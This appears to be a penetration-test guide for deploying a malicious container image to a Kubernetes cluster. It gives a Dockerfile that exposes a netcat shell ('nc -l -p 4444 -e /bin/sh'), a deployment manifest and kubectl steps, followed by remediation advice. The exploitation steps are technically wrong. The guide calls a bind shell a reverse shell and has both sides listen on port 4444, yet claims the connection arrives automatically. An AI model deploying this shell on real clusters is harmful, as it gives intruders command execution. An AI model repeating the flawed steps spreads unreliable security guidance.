
# Kubernetes Penetration Test: Malicious Container Image Deployment

## 1. Overview

This document details the vulnerability of deploying a malicious container image within a Kubernetes cluster. This attack vector can result in complete cluster compromise and significant data exfiltration.

**Attack Vector Description:**

An attacker gains the ability to deploy a container image, either by compromising a CI/CD pipeline, exploiting insecure image registry access, or leveraging misconfigured Kubernetes RBAC (Role-Based Access Control). They then deploy an image containing malicious code, such as a reverse shell or data exfiltration script, which then executes within the Kubernetes environment.

**Potential Impact and Consequences:**

*   **Complete Cluster Compromise:** The malicious container can gain access to sensitive data, secrets, and other resources within the cluster, potentially leading to complete control.
*   **Data Exfiltration:** The container can be used to exfiltrate sensitive data stored within the cluster or accessible to it.
*   **Denial of Service (DoS):** The container can be used to launch DoS attacks against other services running within the cluster or external systems.
*   **Lateral Movement:** The container can be used as a stepping stone to attack other systems within the network.
*   **Privilege Escalation:** The malicious image could potentially exploit kernel vulnerabilities to escalate privileges on the underlying node.

**Risk Level Assessment:**

**Critical**

**Technical Explanation:**

Kubernetes relies on container images as the foundation for deploying applications. If an attacker can inject a malicious image into the deployment process, they can execute arbitrary code within the cluster.  This vulnerability exists because Kubernetes, by default, doesn't inherently validate the contents or trustworthiness of container images. It relies on the user or organization to ensure images are scanned and properly secured.  RBAC misconfigurations exacerbate this issue, allowing unauthorized users or services to deploy images. Insecure image registries without proper authentication and authorization controls are also vulnerable.

**Prerequisites and Conditions Needed:**

1.  **Ability to deploy pods/deployments:** This could be through compromised credentials, RBAC misconfigurations, or vulnerabilities in a CI/CD pipeline.
2.  **Access to a container registry:**  The ability to push a malicious image to a registry that the Kubernetes cluster uses. This could be a public registry, a private registry without proper authentication, or a registry to which the attacker has gained unauthorized access.
3.  **A target Kubernetes cluster:**  The cluster must be configured to pull images from the registry where the malicious image resides.

## 2. Validation and Exploitation Steps

This section details how to validate the vulnerability and exploit it by deploying a malicious container image. We'll use a simple reverse shell example.

**Phase 1: Validation (Identifying Deployable Services)**

1.  **Check RBAC Permissions:** First, verify if you have the necessary permissions to create deployments.
    ```bash
    kubectl auth can-i create deployments
    ```
    *Explanation:* This command checks if the current user or service account has the `create` permission for `deployments`.  It's a quick way to assess if deployment privileges are present.
    *Expected Output:* `yes` indicates you can create deployments, `no` indicates you cannot.
    *Contribution:* Validates the initial requirement for deploying a malicious container.

2.  **Check RBAC Permissions for pods:** Check to see if you can deploy a pod directly.
    ```bash
    kubectl auth can-i create pods
    ```
    *Explanation:* This command checks if the current user or service account has the `create` permission for `pods`.  Direct pod creation might bypass deployment restrictions.
    *Expected Output:* `yes` indicates you can create pods, `no` indicates you cannot.
    *Contribution:* Validates the initial requirement for deploying a malicious container.

**Phase 2: Building and Pushing the Malicious Image**

1.  **Create a Dockerfile for the Malicious Image:**
    ```dockerfile
    FROM alpine:latest
    RUN apk update && apk add netcat-openbsd
    CMD nc -l -p 4444 -e /bin/sh
    ```
    *Explanation:* This Dockerfile creates a simple Alpine Linux-based image with `netcat-openbsd` installed. When the container starts, it listens on port 4444 and executes `/bin/sh` whenever a connection is established (creating a reverse shell).
    *Expected Output:* This creates a functional Dockerfile.

2.  **Build the Malicious Image:** Replace `<your-dockerhub-username>` with your Docker Hub username.
    ```bash
    docker build -t <your-dockerhub-username>/malicious-k8s:latest .
    ```
    *Explanation:* This command builds the Docker image using the Dockerfile in the current directory and tags it with `<your-dockerhub-username>/malicious-k8s:latest`. Make sure to replace `<your-dockerhub-username>` with a valid Docker Hub username where you have push access. Alternatively, push to a private registry you control and adjust the image pull policy later.
    *Expected Output:* Successful image build with no errors.

3.  **Login to Docker Hub (or your private registry):**
    ```bash
    docker login
    ```
    *Explanation:* This command authenticates you with Docker Hub (or your configured registry).  You will be prompted for your username and password.
    *Expected Output:* `Login Succeeded`.

4.  **Push the Malicious Image to Docker Hub (or your private registry):**
    ```bash
    docker push <your-dockerhub-username>/malicious-k8s:latest
    ```
    *Explanation:* This command pushes the built image to Docker Hub (or your private registry). Ensure you have push access to the repository.
    *Expected Output:* Successful image push with no errors.

**Phase 3: Deploying the Malicious Container in Kubernetes**

1.  **Create a Deployment YAML:**

    ```yaml
    apiVersion: apps/v1
    kind: Deployment
    metadata:
      name: malicious-deployment
    spec:
      replicas: 1
      selector:
        matchLabels:
          app: malicious-app
      template:
        metadata:
          labels:
            app: malicious-app
        spec:
          containers:
          - name: malicious-container
            image: <your-dockerhub-username>/malicious-k8s:latest
            imagePullPolicy: Always # force image to always pull
            ports:
            - containerPort: 4444
    ```

    *Explanation:* This YAML file defines a Kubernetes deployment that creates a single pod running the malicious container image.  `imagePullPolicy: Always` is critical to ensure that the cluster actually pulls the malicious image even if an older image with the same tag exists.
    *Expected Output:* A properly formatted YAML file.

2.  **Deploy the Deployment:**
    ```bash
    kubectl apply -f malicious-deployment.yaml
    ```
    *Explanation:* This command creates the deployment in the Kubernetes cluster using the YAML file.
    *Expected Output:*  `deployment.apps/malicious-deployment created`

3.  **Verify the Pod is Running:**
    ```bash
    kubectl get pods
    ```
    *Explanation:* This command lists all pods in the current namespace and checks if the malicious pod is running (status should be `Running`).
    *Expected Output:* A list of pods including `malicious-deployment-*`, with a status of `Running`.

**Phase 4: Exploitation (Gaining a Reverse Shell)**

1.  **Identify the Node the Pod is Running On:**
    ```bash
    kubectl get pod malicious-deployment-$(kubectl get pods -l app=malicious-app -o name | cut -d '/' -f 2) -o wide
    ```
    *Explanation:* This command retrieves the pod name dynamically using the label `app=malicious-app` and then gets detailed information, including the node the pod is running on. The command consists of two parts. `kubectl get pods -l app=malicious-app -o name | cut -d '/' -f 2` extracts the pod name. This is used in the following command `kubectl get pod malicious-deployment-$(...) -o wide` which retrieves detailed information about the pod. The -o wide option gives us additional information about where the pod is running.
    *Expected Output:* The output will show the node name the pod is running on in the `NODE` column. This step allows you to target the right IP address for your reverse shell connection, especially in multi-node clusters.

2.  **Find the internal IP address of the node where the pod is running.**

    ```bash
    kubectl get node <node_name> -o yaml | grep InternalIP | awk '{print $2}'
    ```
    *Explanation:* This command first retrieves the node information using `kubectl get node <node_name> -o yaml` and pipes the output to `grep InternalIP` to filter out the `InternalIP` parameter. Then `awk '{print $2}'` is used to print the IP address found on the second column.
    *Expected Output:* The internal IP address of the node where your malicious pod is running.

3.  **Set up a listener on your attacking machine:**
    ```bash
    nc -l -p 4444
    ```
    *Explanation:* This command starts a `netcat` listener on your machine, waiting for an incoming connection on port 4444.
    *Expected Output:* The command will appear to hang, indicating it is waiting for a connection.

4.  **Trigger the Reverse Shell (nothing to do, connection comes automatically):** Because the container is listening on port 4444 and executing /bin/sh upon connection, no further action is required. The container will automatically attempt to establish a connection to your listening machine.

5.  **Check your Netcat Listener:** You should now have a shell on your attacking machine. Type `whoami` to verify that the connection succeeded and you are inside the container.
    ```bash
    whoami
    ```
    *Explanation:* The reverse shell executed the command to execute a shell on the container environment. You should now be able to run shell commands on the container.
    *Expected Output:*  The user name of the container. Probably root.

**Remediation Recommendations:**

1.  **Implement Image Scanning:** Use tools like Aqua Security, Clair, or Anchore to scan container images for vulnerabilities before deployment.
2.  **Enforce RBAC Policies:**  Implement strict RBAC policies to limit who can create deployments and other resources.  Follow the principle of least privilege.
3.  **Use Pod Security Admission (PSA):** Implement PSA to restrict the capabilities of pods, such as preventing them from running as root or accessing the host network.
4.  **Implement Network Policies:**  Use network policies to restrict network traffic between pods, limiting the blast radius of a compromised container.
5.  **Secure Container Registries:**  Use strong authentication and authorization for container registries. Enable auditing and logging. Consider using a private registry.
6.  **Implement Admission Controllers:**  Use admission controllers to enforce policies at the time of pod creation, such as requiring image signatures or restricting resource requests. Kyverno is a good alternative to OPA.
7.  **Regularly Audit Kubernetes Configuration:** Conduct regular audits of your Kubernetes configuration to identify and address potential security vulnerabilities.
8.  **Use Immutable Infrastructure:** Consider using immutable infrastructure principles, where container images are built once and deployed as is. This reduces the risk of runtime modifications.

This documentation should allow another penetration tester to reproduce this vulnerability and understand its implications. Remember to perform these tests in a controlled environment and with proper authorization.
